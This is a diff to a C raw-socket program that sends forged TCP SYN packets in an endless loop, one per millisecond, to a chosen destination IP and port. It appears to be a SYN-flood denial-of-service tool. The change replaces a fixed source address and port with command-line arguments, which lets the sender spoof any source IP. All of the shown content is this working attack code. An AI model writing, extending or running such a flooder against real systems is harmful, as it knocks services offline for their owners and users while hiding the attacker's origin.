@@ -39,7 +39,7 @@ uint16_t cksum(uint16_t *p, int len)
     return (~(uint16_t) cksum);
 }
 
-void make_syn_packet(char *packet, uint32_t daddr, uint16_t dport)
+void make_syn_packet(char *packet, uint32_t saddr, uint16_t sport, uint32_t daddr, uint16_t dport)
 {
     struct ip_header ih;
     struct tcp_header th;
@@ -54,10 +54,10 @@ void make_syn_packet(char *packet, uint32_t daddr, uint16_t dport)
     ih.ttl = 128;
     ih.proto = IPPROTO_TCP;
     ih.cksum = 0;
-    ih.saddr = 0x12345678;
+    ih.saddr = htonl(saddr);
     ih.daddr = htonl(daddr);
 
-    th.sport = 0x1234;
+    th.sport = htons(sport);
     th.dport = htons(dport);
     th.seq = rand();
     th.ack = 0;
@@ -91,17 +91,19 @@ void prg_exit()
 int main(int argc, char **argv)
 {
     struct sockaddr_in addr;
-    uint32_t daddr;
-    uint16_t dport;
+    uint32_t daddr, saddr;
+    uint16_t dport, sport;
     char packet[sizeof(struct ip_header) + sizeof(struct tcp_header)];
 
-    if (argc != 3)
+    if (argc != 5)
     {
-        printf("usage: %s <dst-ip> <dst-port>\n", argv[0]);
+        printf("usage: %s <dst-ip> <dst-port> <src-ip> <src-port>\n", argv[0]);
         return 1;
     }
     daddr = inet_addr(argv[1]);
     dport = atoi(argv[2]);
+    saddr = inet_addr(argv[3]);
+    sport = atoi(argv[4]);
 
     g_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (g_sockfd < 0)
@@ -128,7 +130,7 @@ int main(int argc, char **argv)
     for (;;)
     {
         usleep(1000);
-        make_syn_packet(packet, htonl(daddr), dport);
+        make_syn_packet(packet, htonl(saddr), sport, htonl(daddr), dport);
 
         if (sendto(g_sockfd, packet, sizeof(packet), 0, (struct sockaddr *) &addr, sizeof(addr)) < 0)
         {
